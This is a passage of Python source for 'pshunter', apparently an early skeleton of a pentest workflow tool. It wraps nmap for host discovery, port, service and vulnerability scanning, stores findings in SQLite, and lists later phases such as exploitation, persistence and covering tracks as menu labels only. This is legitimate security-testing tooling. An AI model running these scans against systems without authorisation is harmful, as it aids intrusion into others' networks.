#!/usr/bin/env python3
"""pshunter — guided offensive workflow runner (skeleton).

A phase-driven companion for pentest / CTF work: it walks a target through the
classic kill-chain stages — host discovery, port enumeration, service detection,
vulnerability scanning, CVE lookup and service exploitation — one deliberate step
at a time. Every phase records what it found so the operator can review progress
via [s] status and browse results via [d] database.

This file is an early skeleton: it draws the banner, lays out the menu and routes
the user's choice to placeholder handlers. The real engines (nmap wrappers, the
SQLite store and the qtermwidget shell-spawning) are intentionally not wired yet.

Authorised use only. Run pshunter exclusively against assets you own or are
explicitly permitted to test.
"""

from __future__ import annotations

import atexit
import ipaddress
import json
import os
import random
import re
import shlex
import shutil
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime


# ── terminal colours ──────────────────────────────────────────────────────────
# Auto-disabled when output is not a TTY or NO_COLOR is set, so piping stays clean.
_COLOR = sys.stdout.isatty() and os.environ.get("NO_COLOR") is None


def _c(code: str) -> str:
    return code if _COLOR else ""


RESET   = _c("\033[0m")
BOLD    = _c("\033[1m")
DIM     = _c("\033[2m")
CYAN    = _c("\033[36m")
GREEN   = _c("\033[32m")
RED     = _c("\033[31m")
YELLOW  = _c("\033[33m")
MAGENTA = _c("\033[35m")
BROWN   = _c("\033[38;2;205;133;63m")   # 24-bit brown (peru) for the options hint line


APP_NAME    = "pshunter"
APP_TAGLINE = "modular offensive security toolkit"
APP_VERSION = "1.0"


# ── banner ────────────────────────────────────────────────────────────────────
def _fallback_banner() -> str:
    """Hand-drawn banner used when pyfiglet is unavailable."""
    return r"""
           _                 _
 _ __  ___| |__  _   _ _ __ | |_ ___ _ __
| '_ \/ __| '_ \| | | | '_ \| __/ _ \ '__|
| |_) \__ \ | | | |_| | | | | ||  __/ |
| .__/|___/_| |_|\__,_|_| |_|\__\___|_|
|_|
"""


def render_banner() -> str:
    """ASCII-art app name. Prefers pyfiglet (ansi_shadow), falls back to a static
    banner so the tool still runs without the dependency."""
    try:
        from pyfiglet import Figlet
        return Figlet(font="ansi_shadow", width=200).renderText(APP_NAME).rstrip("\n")
    except Exception:
        return _fallback_banner().rstrip("\n")


def print_header() -> None:
    print(CYAN + BOLD + render_banner() + RESET)
    print()
    print(f"{DIM}  {APP_TAGLINE} · v{APP_VERSION}{RESET}")
    if hasattr(os, "geteuid") and os.geteuid() != 0:
        print(f"{YELLOW}  ⚠ unprivileged — running as a normal user{RESET}"
              f"{DIM} — press {RESET}{YELLOW}[u]{RESET}{DIM} upgrade{RESET}")
    else:
        print(f"{GREEN}  ● root — full scan capability (raw sockets){RESET}")
    print()


# ── phases (the offensive kill-chain, in order) ───────────────────────────────
# Each entry: (menu key, name, one-line intent). The order is the recommended
# progression; nothing forces it, but later phases build on earlier findings.
PHASES = [
    ("0", "Host discovery",       "find which hosts are alive on the target scope"),
    ("1", "Port enumeration",     "map open TCP/UDP ports on a live host"),
    ("2", "Service detection",    "fingerprint the service/version behind each port"),
    ("3", "Vuln scan",            "run vulnerability checks against detected services"),
    ("4", "CVE lookup",           "match service CPEs to known CVEs"),
    ("5", "Service exploitation", "attempt exploitation / access on a chosen service"),
    ("6", "Privilege Escalation", "escalate to root / SYSTEM on a compromised host"),
    ("7", "Persistence",          "maintain access on a compromised host"),
    ("8", "Covering Tracks",      "clean up artifacts after an authorised engagement"),
]
_PHASES = {key: (name, desc) for key, name, desc in PHASES}


# ── scan-time budget ──────────────────────────────────────────────────────────
MIN_MINUTES = 1        # floor
MAX_MINUTES = 1440     # ceiling: 24 h
DEFAULT_MINUTES = 10   # Enter accepts this


# ── navigation words (accepted at any sub-prompt) ─────────────────────────────
_BACK_WORDS = {"b", "back"}
_HELP_WORDS = {"h", "help", "?"}
_MENU_WORDS = {"m", "menu"}          # jump straight back to the main menu (any depth)


# ── menu ──────────────────────────────────────────────────────────────────────
def print_menu() -> None:
    print(f"  {DIM}workflow{RESET}")
    for key, name, desc in PHASES:
        print(f"  {CYAN}[{key}]{RESET} {BOLD}{name}{RESET}")
    print()
    print(f"  {DIM}actions{RESET}")
    print(f"  {CYAN}[s]{RESET} {BOLD}status{RESET}")
    print(f"  {CYAN}[d]{RESET} {BOLD}database{RESET}")
    print(f"  {CYAN}[n]{RESET} {BOLD}new session{RESET}")
    if not _is_root():
        print(f"  {CYAN}[u]{RESET} {BOLD}upgrade{RESET}")
    print(f"  {CYAN}[h]{RESET} {BOLD}help{RESET}")
    print()
    print(f"  {DIM}/exit  quit{RESET}")


# ── help ──────────────────────────────────────────────────────────────────────
def print_help() -> None:
    """Full usage — kept off the main screen so it stays clean."""
    print(f"\n{BOLD}{CYAN}pshunter — help{RESET}\n")

    print(f"{BOLD}Phases{RESET}")
    for key, name, desc in PHASES:
        print(f"  {CYAN}[{key}]{RESET} {BOLD}{name:<20}{RESET}{DIM} {desc}{RESET}")
    print()

    print(f"{BOLD}Host discovery — target formats{RESET}")
    print(f"  {DIM}192.168.1.0/24{RESET}             subnet in CIDR notation")
    print(f"  {DIM}192.168.1.0{RESET}                bare IP — assumed /24")
    print(f"  {DIM}192.168.1.10-192.168.1.40{RESET}  range, full end address")
    print(f"  {DIM}192.168.1.10-40{RESET}            range, end = last octet")
    print()

    print(f"{BOLD}Time budget{RESET}")
    print(f"  {DIM}minutes · Enter = {DEFAULT_MINUTES} · {MIN_MINUTES}–{MAX_MINUTES} (24 h){RESET}")
    print()

    print(f"{BOLD}Menu actions{RESET}")
    print(f"  {BOLD}status{RESET}     command history + state; {BOLD}v <n>{RESET} view command+output "
          f"in a new terminal, {BOLD}stop <n>{RESET} abort, {BOLD}c{RESET} clear finished")
    print(f"  {BOLD}database{RESET}   discovered hosts; type a number for its ports, "
          f"{BOLD}r <n>{RESET} remove, {BOLD}c{RESET} wipe all")
    print(f"  {DIM}           inside a host: {BOLD}[f]{RESET}{DIM} findings, {BOLD}[p]{RESET}{DIM} progress "
          f"(per-phase tracker — which phases ran and what's pending; a number runs one){RESET}")
    print(f"  {BOLD}new session{RESET}  wipe the whole database (hosts + history) for a fresh start")
    print(f"  {BOLD}upgrade{RESET}      re-run under sudo for root (SYN/UDP scans); progress is kept")
    print()

    print(f"{BOLD}Navigation{RESET}")
    print(f"  {BOLD}h{RESET} / {BOLD}help{RESET} / {BOLD}?{RESET}   show this screen")
    print(f"  {BOLD}b{RESET} / {BOLD}back{RESET}       return to the menu")
    print(f"  {BOLD}/exit{RESET}          quit pshunter")
    print()


# ── input helper ──────────────────────────────────────────────────────────────
class _ExitApp(Exception):
    """Raised from any prompt when the user types /exit — quits the whole app."""


class _ToMenu(Exception):
    """Raised from any prompt when the user types m/menu — pops out of every nested view
    straight back to the main menu (the main loop catches it and just redraws the menu)."""


def _ask(label: str) -> "str | None":
    """Prompt for a line. Returns the stripped text, or None if the user aborts
    (Ctrl+C / EOF) — callers treat None as 'back to the menu'. Typing /exit anywhere
    raises _ExitApp (quit); m/menu raises _ToMenu (jump to the main menu)."""
    try:
        value = input(f"{BOLD}{label}{RESET} ").strip()
    except (EOFError, KeyboardInterrupt):
        print()
        return None
    low = value.lower()
    if low in ("/exit", "\\exit"):
        raise _ExitApp
    if low in _MENU_WORDS:
        raise _ToMenu
    return value


def _ctx_ask(module: str, options: str = "") -> "str | None":
    """Prompt tagged with the module you're in (coloured, for readability) and, one
    line above, a short hint of what you can type — tinted brown so it reads as
    interactive options, distinct from normal output."""
    if options:
        print(f"  {BROWN}{options}{RESET}")
    return _ask(f"{CYAN}[{module}]{RESET}{DIM} ›{RESET}")


def _hr() -> None:
    """Thin divider used inside interactive views to separate one chosen action's
    output from the next."""
    print(f"{DIM}{'─' * 56}{RESET}")


# ── host discovery (phase 1) ──────────────────────────────────────────────────
# A range wider than this is refused for expansion — use CIDR instead (nmap can
# only express an arbitrary start-end as a single token when the hosts share the
# same /24; otherwise we would have to hand nmap a huge explicit target list).
_MAX_RANGE_EXPAND = 8192


def parse_discovery_target(value: str) -> "tuple[bool, str, dict]":
    """Validate a host-discovery scope. Accepts a CIDR subnet, a bare IP (taken as
    /24), or an inclusive range ``start-end`` where ``end`` is either a full IPv4
    address or just the final octet. Returns ``(ok, error, parsed)`` where, on
    success, ``parsed = {"scope": <str>, "hosts": <int>, "targets": [<nmap arg>…]}``.
    """
    value = value.strip()
    if not value:
        return False, "empty — give a subnet or range", {}

    if "-" in value:                                   # start-end range (IPv4)
        left, _, right = value.partition("-")
        try:
            start = ipaddress.ip_address(left.strip())
        except ValueError:
            return False, "range start is not a valid IPv4 address", {}
        if start.version != 4:
            return False, "ranges are IPv4 only", {}
        right = right.strip()
        if "." in right:
            try:
                end = ipaddress.ip_address(right)
            except ValueError:
                return False, "range end is not a valid IPv4 address", {}
        elif right.isdigit() and 0 <= int(right) <= 255:
            end = ipaddress.ip_address((int(start) & 0xFFFFFF00) | int(right))
        else:
            return False, "range end must be an IP or a 0-255 octet", {}
        if int(end) < int(start):
            return False, "range end is before its start", {}
        hosts = int(end) - int(start) + 1
        if int(start) >> 8 == int(end) >> 8:           # same /24 -> compact nmap token
            targets = [f"{str(start).rsplit('.', 1)[0]}.{int(start) & 0xFF}-{int(end) & 0xFF}"]
        elif hosts <= _MAX_RANGE_EXPAND:               # spans /24s -> explicit list
            targets = [str(ipaddress.ip_address(i)) for i in range(int(start), int(end) + 1)]
        else:
            return False, "range too large — use CIDR notation", {}
        return True, "", {"scope": f"{start}-{end}", "hosts": hosts, "targets": targets}

    if "/" not in value:                               # bare IP -> assume a mask
        try:
            addr = ipaddress.ip_address(value)
        except ValueError:
            return False, "not a valid IP address", {}
        value = f"{value}/{24 if addr.version == 4 else 64}"

    try:
        net = ipaddress.ip_network(value, strict=False)
    except ValueError:
        return False, "not a valid subnet (CIDR)", {}
    return True, "", {"scope": str(net), "hosts": net.num_addresses, "targets": [str(net)]}


def _prompt_minutes(module: str, title: str, detail: str) -> "int | None":
    """Show a one-line summary (title + detail + default time) and read the time
    budget. Enter accepts the default; a number is validated to 1–1440."""
    print(f"\n{GREEN}✓{RESET} {BOLD}{title}{RESET} · {detail} · {DIM}⏱ {DEFAULT_MINUTES}m{RESET}")
    while True:
        v = _ctx_ask(module, f"<minutes {MIN_MINUTES}-{MAX_MINUTES}, Enter={DEFAULT_MINUTES}> · [h] help · [b] back · [m] menu")
        if v is None or v.lower() in _BACK_WORDS:
            return None
        if v.lower() in _HELP_WORDS:
            print_help()
            continue
        if v == "":
            return DEFAULT_MINUTES
        if v.isdigit() and MIN_MINUTES <= int(v) <= MAX_MINUTES:
            return int(v)
        print(f"{RED}✗ 1–{MAX_MINUTES} minutes{RESET}")


def _handle_host_discovery() -> None:
    """Phase 1 flow: read + validate the scope, then the time, then launch."""
    while True:
        value = _ctx_ask("discovery", "<subnet / range> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        ok, err, parsed = parse_discovery_target(value)
        if not ok:
            print(f"{RED}✗ {err}{RESET}")
            continue
        minutes = _prompt_minutes("discovery", "Host discovery",
                                  f"{parsed['scope']} · {parsed['hosts']} host(s)")
        if minutes is None:
            return
        _start_discovery(parsed, minutes)
        print(f"\n{GREEN}▶ host discovery running in the background{RESET} "
              f"{DIM}({parsed['scope']}, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


def _handle_port_enum() -> None:
    """Phase 2 flow: read + validate a single target IP, then the time, then launch
    the concurrent port scans."""
    while True:
        value = _ctx_ask("ports", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        minutes = _prompt_minutes("ports", "Port enumeration", ip)
        if minutes is None:
            return
        _start_port_enum(ip, minutes)
        print(f"\n{GREEN}▶ port enumeration running in the background{RESET} "
              f"{DIM}({ip} · fast + full TCP + UDP, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


def _handle_service_detection() -> None:
    """Phase 3 flow: read a target IP, then the time, then launch -sV -sC (+ OS) on the
    open ports discovered in phase 2."""
    while True:
        value = _ctx_ask("service", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_ports(ip):
            print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
                  f"enumeration{RESET}{DIM} first (OS scan still runs if root){RESET}")
        minutes = _prompt_minutes("service", "Service detection", ip)
        if minutes is None:
            return
        _start_service_detection(ip, minutes)
        print(f"\n{GREEN}▶ service detection running in the background{RESET} "
              f"{DIM}({ip} · -sV -sC + OS, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


def _handle_vuln_scan() -> None:
    """Phase 4 flow: read a target IP, then the time, then launch targeted vuln/auth
    NSE scans mapped to the host's detected services."""
    while True:
        value = _ctx_ask("vuln", "<single IP> · [h] help · [b] back · [m] menu")
        if value is None or value.lower() in _BACK_WORDS:
            return
        if value.lower() in _HELP_WORDS:
            print_help()
            continue
        try:
            ip = str(ipaddress.ip_address(value))
        except ValueError:
            print(f"{RED}✗ give one valid IP address{RESET}")
            continue
        if not fetch_ports(ip):
            print(f"{DIM}note: no open ports recorded for {ip} — run {BOLD}[1] Port "
                  f"enumeration{RESET}{DIM} (and {BOLD}[2] Service detection{RESET}{DIM}) first{RESET}")
            continue
        print(f"{DIM}vuln + auth scripting{RESET}")
        minutes = _prompt_minutes("vuln", "Vuln scan", ip)
        if minutes is None:
            return
        _start_vuln_scan(ip, minutes)
        print(f"\n{GREEN}▶ vuln scan running in the background{RESET} "
              f"{DIM}({ip} · targeted NSE vuln+auth, ⏱ {minutes}m) — check {BOLD}[s] status{RESET}")
        return


# ── host-discovery nmap engine ────────────────────────────────────────────────
# Two passes, per OSCP/HTB practice. Pass 1 is a fast default sweep: as root, -sn
# already fires ICMP echo + TCP SYN 443 + TCP ACK 80 + ICMP timestamp, and ARP on
# a local segment — this catches the easy, responsive hosts quickly. Pass 2 is a
# thorough multi-probe sweep for hosts that drop the common probes: extra ICMP
# types plus TCP SYN/ACK and UDP probes across the ports firewalls usually let
# through (web/DNS/SMB/RDP/SNMP). Sent in parallel so at least one gets through.
# Both use -n (no DNS) for speed; results from the two passes are unioned.
_DISCOVERY_FAST = ["-sn", "-n", "-T4", "--max-retries", "1"]
_DISCOVERY_SLOW = [
    "-sn", "-n", "-T3",
    "-PE", "-PP", "-PM",                                     # ICMP echo / timestamp / netmask
    "-PS21,22,23,25,53,80,110,139,443,445,3389,8080",       # TCP SYN to common open ports
    "-PA80,443,3389",                                        # TCP ACK (bypass stateless SYN blocks)
    "-PU53,161,137",                                         # UDP to DNS / SNMP / NetBIOS
]


def _safe_unlink(path: str) -> None:
    try:
        os.unlink(path)
    except OSError:
        pass


def _host_from_elem(elem) -> "dict | None":
    """Build an up-host dict from one nmap ``<host>`` XML element (no ports: -sn)."""
    st = elem.find("status")
    if st is None or st.get("state") != "up":
        return None
    ip = mac = vendor = hostname = None
    for addr in elem.findall("address"):
        kind = addr.get("addrtype")
        if kind == "ipv4":
            ip = addr.get("addr")
        elif kind == "mac":
            mac, vendor = addr.get("addr"), addr.get("vendor")
    if not ip:
        return None
    hn = elem.find("hostnames/hostname")
    if hn is not None:
        hostname = hn.get("name")
    return {"ip": ip, "mac": mac, "vendor": vendor, "hostname": hostname}


def _host_ports_from_elem(elem) -> "dict | None":
    """Extract open (or open|filtered) ports from one nmap ``<host>`` element. Each
    port keeps its state and, when present, nmap's service guess (name/product/
    version) — filled in properly later by the service-detection phase."""
    ip = None
    for addr in elem.findall("address"):
        if addr.get("addrtype") == "ipv4":
            ip = addr.get("addr")
    if not ip:
        return None
    rows = []
    for port in elem.findall("ports/port"):
        pstate = port.find("state")
        state = pstate.get("state") if pstate is not None else None
        if state not in ("open", "open|filtered"):
            continue
        svc = port.find("service")
        service = None
        if svc is not None:
            service = {"name": svc.get("name"), "product": svc.get("product"),
                       "version": svc.get("version")}
        rows.append({"port": int(port.get("portid")), "proto": port.get("protocol") or "tcp",
                     "state": state, "service": service})
    return {"ip": ip, "ports": rows} if rows else None


def _host_detail_from_elem(elem) -> "dict | None":
    """Extract service-detection results from one nmap ``<host>`` element: probed
    services (name/product/version/cpe), NSE (-sC) script output per port (plus any
    host-level scripts under port 0), and the best OS match."""
    ip = None
    for addr in elem.findall("address"):
        if addr.get("addrtype") == "ipv4":
            ip = addr.get("addr")
    if not ip:
        return None
    services, scripts, hostnames = [], [], []
    for port in elem.findall("ports/port"):
        portid = int(port.get("portid"))
        proto = port.get("protocol") or "tcp"
        svc = port.find("service")
        if svc is not None and svc.get("method") == "probed":
            cpe = None
            for c in svc.findall("cpe"):
                txt = (c.text or "").strip()
                if txt and (cpe is None or txt.startswith("cpe:/a")):
                    cpe = txt                       # prefer the application CPE
            services.append({"port": portid, "proto": proto, "name": svc.get("name"),
                             "product": svc.get("product"), "version": svc.get("version"),
                             "cpe": cpe})
            if svc.get("hostname"):                 # nmap resolves a name (often the TLS cert CN)
                hostnames.append({"port": portid, "hostname": svc.get("hostname"), "source": "service"})
        for scr in port.findall("script"):
            scripts.append({"port": portid, "proto": proto,
                            "id": scr.get("id"), "output": scr.get("output")})
    for scr in elem.findall("hostscript/script"):   # host-level scripts (port 0)
        scripts.append({"port": 0, "proto": "", "id": scr.get("id"),
                        "output": scr.get("output")})
    om = elem.find("os/osmatch")
    os_name = om.get("name") if om is not None else None
    if not (services or scripts or os_name):
        return None
    return {"ip": ip, "services": services, "scripts": scripts, "os": os_name,
            "hostnames": hostnames}


def _run_nmap(args: list, targets: list, on_items, deadline: "float | None" = None,
              should_stop=None, parse_elem=None):
    """Run nmap (XML to a temp file), tail it with an incremental parser and hand each
    parsed ``<host>`` element to ``on_items`` as it appears. ``parse_elem`` turns an
    element into an item (defaults to the host parser for -sn; the port parser is used
    for port scans). XML feeds the parser; nmap's normal stdout is captured separately
    (for the report terminal). Returns ``(items, output_text)``, or ``(None, None)`` if
    nmap is missing. ``deadline`` hard-caps the run; ``should_stop`` is polled each tick
    to kill it early. Whatever streamed so far is kept."""
    parse_elem = parse_elem or _host_from_elem
    import xml.etree.ElementTree as ET
    tmp = tempfile.NamedTemporaryFile(prefix="pshunter_", suffix=".xml", delete=False)
    tmp.close()
    out = tempfile.NamedTemporaryFile(prefix="pshunter_out_", suffix=".txt", delete=False)
    full = ["nmap", "-oX", tmp.name] + args + targets
    try:
        proc = subprocess.Popen(full, stdout=out, stderr=subprocess.STDOUT,
                                stdin=subprocess.DEVNULL, start_new_session=True)
    except FileNotFoundError:
        out.close()
        _safe_unlink(tmp.name)
        _safe_unlink(out.name)
        return None, None
    out.close()

    parser = ET.XMLPullParser(("end",))
    all_items, pending, pos = [], [], 0
    start = time.time()

    def _flush():
        if pending:
            on_items(list(pending))
            all_items.extend(pending)
            pending.clear()

    def _consume():
        nonlocal pos
        try:
            with open(tmp.name, "rb") as fh:
                fh.seek(pos)
                chunk = fh.read()
                pos = fh.tell()
        except OSError:
            chunk = b""
        if chunk:
            try:
                parser.feed(chunk)
            except ET.ParseError:
                pass
            for _ev, elem in parser.read_events():
                if elem.tag == "host":
                    item = parse_elem(elem)
                    if item:
                        pending.append(item)
                    elem.clear()
        return chunk

    try:
        while True:
            alive = proc.poll() is None
            chunk = _consume()
            if len(pending) >= 8:
                _flush()
            if not alive and not chunk:
                break
            timed_out = deadline is not None and (time.time() - start) > deadline
            if timed_out or (should_stop is not None and should_stop()):
                proc.terminate()
                try:
                    proc.wait(timeout=3)
                except subprocess.TimeoutExpired:
                    proc.kill()
                _consume()
                break
            if alive:
                time.sleep(0.4)
        _flush()
    finally:
        _safe_unlink(tmp.name)
    try:
        with open(out.name, "r", encoding="utf-8", errors="replace") as fh:
            output = fh.read()
    except OSError:
        output = ""
    _safe_unlink(out.name)
    return all_items, output


# ── self-IP guard (never record loopback / the scanner's own address) ─────────
_OWN_ADDRS: "set | None" = None


def _own_addresses() -> set:
    """This machine's interface IPs, computed once and cached."""
    global _OWN_ADDRS
    if _OWN_ADDRS is None:
        addrs: set = set()
        try:
            out = subprocess.run(["ip", "-o", "addr", "show"], capture_output=True,
                                 text=True, timeout=10, stdin=subprocess.DEVNULL).stdout
            for line in out.splitlines():
                parts = line.split()
                for i, tok in enumerate(parts):
                    if tok in ("inet", "inet6") and i + 1 < len(parts):
                        addrs.add(parts[i + 1].split("/")[0])
        except (OSError, subprocess.SubprocessError):
            pass
        _OWN_ADDRS = addrs
    return _OWN_ADDRS


def _refresh_own_addresses() -> None:
    """Force the own-address cache to be recomputed (call at every scan start so a
    mid-session IP change — e.g. connecting a VPN — is reflected in the guard)."""
    global _OWN_ADDRS
    _OWN_ADDRS = None
    _own_addresses()


def _is_self_ip(ip: str) -> bool:
    """True for loopback or one of this machine's own interface addresses."""
    try:
        if ipaddress.ip_address(ip).is_loopback:
            return True
    except ValueError:
        return False
    return ip in _own_addresses()


# ── database (discovered hosts) ───────────────────────────────────────────────
# This script lives in appdata/terminal_modules/; keep the runtime DB up in appdata/
# (a data location) rather than next to the code.
DB_PATH = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "pshunter.db")
# Offline CPE→CVE index (built by the installer from NVD; see build_cve_index). Read-only.
CVE_INDEX_PATH = os.path.join(os.path.dirname(DB_PATH), "cve_index.db")
# CISA Known Exploited Vulnerabilities — CVE ids actually exploited in the wild. Bundled
# text file (one CVE per line); used to surface KEV matches first in the findings view.
KEV_PATH = os.path.join(os.path.dirname(DB_PATH), "kev.txt")
_KEV_CACHE: "set | None" = None


def _load_kev() -> set:
    """The set of CISA KEV CVE ids (cached). Empty if the file is missing."""
    global _KEV_CACHE
    if _KEV_CACHE is None:
        kev = set()
        try:
            with open(KEV_PATH, encoding="utf-8") as fh:
                for line in fh:
                    line = line.strip()
                    if line.startswith("CVE-"):
                        kev.add(line)
        except OSError:
            pass
        _KEV_CACHE = kev
    return _KEV_CACHE
_DB_LOCK = threading.Lock()
_SCHEMA = """
CREATE TABLE IF NOT EXISTS hosts (
    ip          TEXT PRIMARY KEY,
    mac         TEXT,
    vendor      TEXT,
    hostname    TEXT,
    os          TEXT,
    first_seen  TEXT,
    last_seen   TEXT
);
CREATE TABLE IF NOT EXISTS jobs (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    created     TEXT,
    phase       TEXT,
    name        TEXT,
    command     TEXT,
    state       TEXT,
    hosts       INTEGER,
    error       TEXT,
    output      TEXT,
    run         TEXT
);
CREATE TABLE IF NOT EXISTS ports (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    state       TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto)
);
CREATE TABLE IF NOT EXISTS services (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    name        TEXT,
    product     TEXT,
    version     TEXT,
    cpe         TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto)
);
CREATE TABLE IF NOT EXISTS scripts (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    script      TEXT,
    output      TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto, script)
);
CREATE TABLE IF NOT EXISTS vulns (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    script      TEXT,
    state       TEXT,
    cve         TEXT,
    risk        TEXT,
    summary     TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto, script)
);
CREATE TABLE IF NOT EXISTS exploit_steps (
    ip          TEXT,
    port        INTEGER,
    proto       TEXT,
    service     TEXT,
    step        INTEGER,
    status      TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, port, proto, service, step)
);
CREATE TABLE IF NOT EXISTS hostnames (
    ip          TEXT,
    port        INTEGER,
    hostname    TEXT,
    source      TEXT,
    first_seen  TEXT,
    last_seen   TEXT,
    PRIMARY KEY (ip, hostname)
);
"""


def _chown_db_to_user() -> None:
    """When running as root via sudo, hand the DB and its WAL sidecar files back to the
    invoking user (SUDO_UID/GID). Called on every connection so ownership is kept
    correct continuously — surviving a crash / SIGKILL / terminal close, unlike an
    exit-time fixup. No-op when not root or not launched through sudo."""
    if not (hasattr(os, "geteuid") and os.geteuid() == 0):
        return
    uid = os.environ.get("SUDO_UID")
    if not uid:
        return
    try:
        uid, gid = int(uid), int(os.environ.get("SUDO_GID") or uid)
    except ValueError:
        return
    for suffix in ("", "-wal", "-shm"):          # SQLite WAL keeps two sidecar files
        path = DB_PATH + suffix
        if os.path.exists(path):
            try:
                os.chown(path, uid, gid)
            except OSError:
                pass


def _db_connect() -> "sqlite3.Connection":
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.execute("PRAGMA journal_mode=WAL")
    conn.executescript(_SCHEMA)
    # Migrate pre-existing tables that predate a column (IF NOT EXISTS above won't
    # alter an existing table).
    jcols = {r[1] for r in conn.execute("PRAGMA table_info(jobs)").fetchall()}
    if jcols and "output" not in jcols:
        conn.execute("ALTER TABLE jobs ADD COLUMN output TEXT")
    if jcols and "run" not in jcols:
        conn.execute("ALTER TABLE jobs ADD COLUMN run TEXT")
    hcols = {r[1] for r in conn.execute("PRAGMA table_info(hosts)").fetchall()}
    if hcols and "os" not in hcols:
        conn.execute("ALTER TABLE hosts ADD COLUMN os TEXT")
    conn.commit()
    _chown_db_to_user()          # keep the DB user-owned even while running as root
    return conn


def save_hosts(hosts: list) -> int:
    """Upsert discovered hosts by IP; keeps first non-null mac/vendor/hostname/os."""
    if not hosts:
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    saved = 0
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for h in hosts:
                ip = h.get("ip")
                if not ip or _is_self_ip(ip):       # never store loopback / own address
                    continue
                conn.execute(
                    "INSERT INTO hosts (ip, mac, vendor, hostname, os, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip) DO UPDATE SET "
                    "  mac       = COALESCE(excluded.mac, mac), "
                    "  vendor    = COALESCE(excluded.vendor, vendor), "
                    "  hostname  = COALESCE(excluded.hostname, hostname), "
                    "  os        = COALESCE(excluded.os, os), "
                    "  last_seen = excluded.last_seen",
                    (ip, h.get("mac"), h.get("vendor"), h.get("hostname"), h.get("os"), now, now),
                )
                saved += 1
            conn.commit()
        finally:
            conn.close()
    return saved


def fetch_hosts() -> list:
    """(ip, mac, vendor, hostname, os, nports) rows, sorted by IP; nports is the count
    of open ports recorded for the host. [] if the DB is empty."""
    if not os.path.exists(DB_PATH):
        return []
    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        rows = conn.execute(
            "SELECT h.ip, h.mac, h.vendor, h.hostname, h.os, "
            "  (SELECT COUNT(*) FROM ports p WHERE p.ip = h.ip) "
            "FROM hosts h").fetchall()
    except sqlite3.OperationalError:      # file exists but schema not created yet
        return []
    finally:
        conn.close()

    def _key(row):
        try:
            return (0, int(ipaddress.ip_address(row[0])))
        except ValueError:
            return (1, 0)
    rows.sort(key=_key)
    return rows


def save_ports(ip: str, rows: list) -> int:
    """Upsert open ports for a host by (ip, port, proto). When a scan carried a service
    guess (nmap's port->name table, or -sV later), it's upserted into the services
    table too — kept non-null so the service-detection phase only enriches it."""
    if not ip or not rows or _is_self_ip(ip):
        return 0
    now = datetime.now().isoformat(timespec="seconds")
    with _DB_LOCK:
        conn = _db_connect()
        try:
            for r in rows:
                conn.execute(
                    "INSERT INTO ports (ip, port, proto, state, first_seen, last_seen) "
                    "VALUES (?, ?, ?, ?, ?, ?) "
                    "ON CONFLICT(ip, port, proto) DO UPDATE SET "
                    "  state = excluded.state, last_seen = excluded.last_seen",
                    (ip, r["port"], r["proto"], r.get("state"), now, now),
                )
                svc = r.get("service") or {}
                if svc.get("name") or svc.get("product") or svc.get("version"):
                    conn.execute(
                        "INSERT INTO services (ip, port, proto, name, product, version, cpe, "
                        "first_seen, last_seen) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?) "
                        "ON CONFLICT(ip, port, proto) DO UPDATE SET "
                        "  name     = COALESCE(excluded.name, name), "
                        "  product  = COALESCE(excluded.product, product), "
                        "  version  = COALESCE(excluded.version, version), "
                        "  last_seen = excluded.last_seen",
                        (ip, r["port"], r["proto"], svc.get("name"), svc.get("product"),
                         svc.get("version"), None, now, now),
                    )
            conn.commit()
        finally:
            conn.close()
    return len(rows)


def _fetch(query: str, params: tuple) -> list:
    """Run a read query, returning [] if the DB/table isn't there yet."""
    if not os.path.exists(DB_PATH):
        return []
    conn = sqlite3.connect(DB_PATH, timeout=30)
    try:
        return conn.execute(query, params).fetchall()
    except sqlite3.OperationalError:
        return []
    finally:
        conn.close()


def fetch_ports(ip: str) -> list:
    """(port, proto, state) rows for a host, TCP first then UDP, ascending port."""
    rows = _fetch("SELECT port, proto, state FROM ports WHERE ip = ?", (ip,))
    return sorted(rows, key=lambda r: (r[1], r[0]))


def fetch_services(ip: str) -> dict:
    """{(port, proto): (name, product, version, cpe)} for a host."""
    rows = _fetch("SELECT port, proto, name, product, version, cpe FROM services WHERE ip = ?", (ip,))
    return {(p, pr): (n, prod, ver, cpe) for p, pr, n, prod, ver, cpe in rows}


def save_services(ip: str, rows: list) -> int:
    """Upsert probed service data (-sV) by (ip, port, proto), overwriting the earlier
    port-enum guess with the real name/product/version/cpe."""
    if not ip or not rows or _is_self_ip(ip):
        return 0
    now = datetime.now().isoformat(timespec="seconds")
